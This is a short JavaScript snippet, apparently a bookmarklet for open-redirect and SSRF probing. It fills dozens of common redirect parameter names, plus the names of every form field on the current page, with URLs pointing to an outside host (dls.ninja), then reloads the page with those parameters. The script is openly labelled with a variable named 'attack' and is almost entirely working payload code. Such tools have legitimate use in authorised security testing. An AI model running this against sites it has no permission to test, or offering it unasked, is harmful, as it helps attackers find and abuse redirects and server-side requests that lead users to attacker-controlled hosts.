(function() {
    var str = 'BackURL=https://dls.ninja/BackURL&RedirectTo=https://dls.ninja/RedirectTo&a=https://dls.ninja/a&back=https://dls.ninja/back&continue=https://dls.ninja/continue&url=https://dls.ninja/url&URL=https://dls.ninja/URL&done=https://dls.ninja/done&exit=https://dls.ninja/exit&exit_uri=https://dls.ninja/exit_uri&follow=https://dls.ninja/follow&forward=https://dls.ninja/forward&go=https://dls.ninja/go&goto=https://dls.ninja/goto&gotourl=https://dls.ninja/gotourl&host=https://dls.ninja/host&link=https://dls.ninja/link&next=https://dls.ninja/next&origin=https://dls.ninja/origin&out=https://dls.ninja/out&page=https://dls.ninja/page&path=https://dls.ninja/path&redir=https://dls.ninja/redir&redir_uri=https://dls.ninja/redir_uri&pdf=https://dls.ninja/pdf&frame=https://dls.ninja/frame&redir_url=https://dls.ninja/redir_url&redirect=https://dls.ninja/redirect&redirectAction=https://dls.ninja/redirectAction&redirect_link=https://dls.ninja/redirect_link&redirect_uri=https://dls.ninja/redirect_uri&redirect_url=https://dls.ninja/redirect_url&resource=https://dls.ninja/resource&return=https://dls.ninja/return&returnTo=https://dls.ninja/returnTo&return_to=https://dls.ninja/return_to&returnpage=https://dls.ninja/returnpage&returnurl=https://dls.ninja/returnurl&route=https://dls.ninja/route&routeTo=https://dls.ninja/routeTo&send=https://dls.ninja/send&shop=https://dls.ninja/shop&source=https://dls.ninja/source&src=https://dls.ninja/src&state=https://dls.ninja/state&succUrl=https://dls.ninja/succUrl&target=https://dls.ninja/target&targetUrl=https://dls.ninja/targetUrl&tgo=https://dls.ninja/tgo&to=https://dls.ninja/to&u=https://dls.ninja/u&uri=https://dls.ninja/uri&ret=https://dls.ninja/ret';
    var attack = "https://dls.ninja/";
    if (!attack) return false;

    function getallelems(v) {
        var ii = document.getElementsByTagName(v);
        for (var i = 0; i < ii.length; i++) {
            if (!ii[i].name) continue;
            str += (str ? '&' : '') + ii[i].name + '=' + attack + ii[i].name;
        }
    }
    getallelems('input');
    getallelems('textarea');
    getallelems('select');
    str = document.location.search + (document.location.search.indexOf('?') == -1 ? '?' : '&') + str;
    document.location.search = str;
})();